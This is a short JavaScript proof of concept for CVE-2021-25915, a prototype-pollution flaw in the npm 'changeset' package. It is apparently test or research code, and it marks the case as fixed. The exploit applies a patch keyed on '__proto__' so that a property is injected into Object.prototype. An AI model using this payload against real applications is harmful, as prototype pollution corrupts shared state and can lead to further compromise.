//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915
// FIXED
// TODO: changeset contains PP case with `delete` (changeset_lib\node_modules\changeset\index.js:102)
const changeset = require("changeset");
const patch = [{ type: "put", key: ["__proto__", "polluted"], value: "yes" }];
changeset.apply(patch, {}, true);
